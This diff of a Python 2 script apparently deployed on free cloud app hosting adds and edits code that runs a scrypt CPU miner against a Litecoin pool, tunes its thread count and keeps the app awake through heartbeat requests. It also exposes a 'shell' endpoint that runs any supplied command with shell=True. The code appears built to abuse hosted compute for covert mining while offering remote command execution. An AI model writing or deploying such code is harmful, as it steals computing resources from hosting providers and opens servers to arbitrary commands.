@@ -68,7 +68,7 @@ def cpu_info():
 
 @engine.define( 'shell' )
 # 调试 {'cmd':'ls -l' }
-def OutputShell( cmd, **params ):
+def Shell( cmd, **params ):
 	print 'shell:',cmd
 	result = subprocess.Popen(
 		#[ "ping 127.0.0.1" ],
@@ -78,27 +78,6 @@ def OutputShell( cmd, **params ):
 		stdout=subprocess.PIPE,
 		stderr=subprocess.PIPE
 	)
-	# read date from pipe
-	n=0
-	select_rfds = [ result.stdout, result.stderr ]
-	while len( select_rfds ) > 0:
-		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
-		if result.stdout in rfds:
-			readbuf_msg = result.stdout.readline()      #行缓冲
-			if len( readbuf_msg ) == 0:
-				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
-			else:
-				print readbuf_msg,
-
-		if result.stderr in rfds:
-			readbuf_errmsg = result.stderr.readline()
-			if len( readbuf_errmsg ) == 0:
-				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
-			else:
-				print readbuf_errmsg,
-		if(n%64==0):
-			print psutil.cpu_times_percent()
-		n += 1
 
 	result.wait() # 等待字进程结束( 等待shell命令结束 )
 	print result.returncode
@@ -140,7 +119,7 @@ def cmd_cpulimit(**params):
 @engine.define( 'enginerestart' )
 def EngineRestart(**params):
 	global ENGNIE_RESTARTED
-	str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --threads=7 --user=waylite'
+	str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --threads=6 --user=waylite'
 	if(ENGNIE_RESTARTED):
 		print 'EngineRestart:Once'
 		ENGNIE_RESTARTED = False
@@ -148,7 +127,7 @@ def EngineRestart(**params):
 		time.sleep(2)
 		WORK_ID = os.environ.get( 'WORK_ID' )
 		str_cmd += ' --userpass waylite.' + WORK_ID + ':x'
-		OutputShell(str_cmd)
+		Shell(str_cmd)
 	else:
 		pass
 		#print 'Engine Running:Pass'
@@ -172,4 +151,41 @@ def Heart_herokuapp(**params):
 	response = requests.get( "https://my-m002.herokuapp.com/" )
 	print '..Heart End'
 	return True
+
+def OutputShell( cmd, **params ):
+	print 'shell:',cmd
+	result = subprocess.Popen(
+		#[ "ping 127.0.0.1" ],
+		#[ "find /usr" ],
+		[ cmd ],
+		shell=True,
+		stdout=subprocess.PIPE,
+		stderr=subprocess.PIPE
+	)
+	# read date from pipe
+	n=0
+	select_rfds = [ result.stdout, result.stderr ]
+	while len( select_rfds ) > 0:
+		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
+		if result.stdout in rfds:
+			readbuf_msg = result.stdout.readline()      #行缓冲
+			if len( readbuf_msg ) == 0:
+				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
+			else:
+				print readbuf_msg,
+
+		if result.stderr in rfds:
+			readbuf_errmsg = result.stderr.readline()
+			if len( readbuf_errmsg ) == 0:
+				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
+			else:
+				print readbuf_errmsg,
+		if(n%48==0):
+			print psutil.cpu_times_percent()
+		n += 1
+
+	result.wait() # 等待字进程结束( 等待shell命令结束 )
+	print result.returncode
+	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
+	return result.returncode
 
